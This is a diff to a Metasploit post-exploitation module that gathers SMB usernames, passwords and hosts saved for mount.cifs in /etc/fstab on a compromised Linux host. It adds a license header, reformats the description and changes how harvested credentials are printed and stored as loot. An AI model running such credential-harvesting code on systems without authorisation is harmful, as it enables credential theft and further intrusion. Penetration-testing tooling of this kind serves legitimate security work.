@@ -1,3 +1,10 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
 require 'msf/core'
 require 'msf/core/post/common'
 require 'msf/core/post/file'
@@ -10,7 +17,10 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Linux Gather credentials saved for mount.cifs/mount.smbfs',
-				'Description'   => %q{Post Module to obtain credentials saved for mount.cifs/mount.smbfs in /etc/fstab on a Linux system},
+				'Description'   => %q{
+					Post Module to obtain credentials saved for mount.cifs/mount.smbfs in
+					/etc/fstab on a Linux system.
+				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>'],
 				'Platform'      => [ 'linux' ],
@@ -72,12 +82,19 @@ class Metasploit3 < Msf::Post
 				report_auth_info({ :port => 445, :sname => 'smb', :type => 'password', :active => true }.merge(cred))
 			end
 			cred_table << [ cred[:user], cred[:pass], cred[:host], cred[:file] ]
-			print_good("SMB credentials: user=#{cred[:user]}, pass=#{cred[:pass]}, host=#{cred[:host]} from #{cred[:file]}")
 		end
 
 		# store all found credentials
-		unless (creds.empty?)
-			store_loot("mount.cifs.creds", "text/csv", session, cred_table.to_csv, "mount_cifs_credentials.txt", "mount.cifs credentials")
+		unless (cred_table.rows.empty?)
+			print_line("\n" + cred_table.to_s)
+			p = store_loot(
+				"mount.cifs.creds",
+				"text/csv",
+				session,
+				cred_table.to_csv,
+				"mount_cifs_credentials.txt",
+				"mount.cifs credentials")
+			print_status("CIFS credentials saved in: #{p.to_s}")
 		end
 	end
 
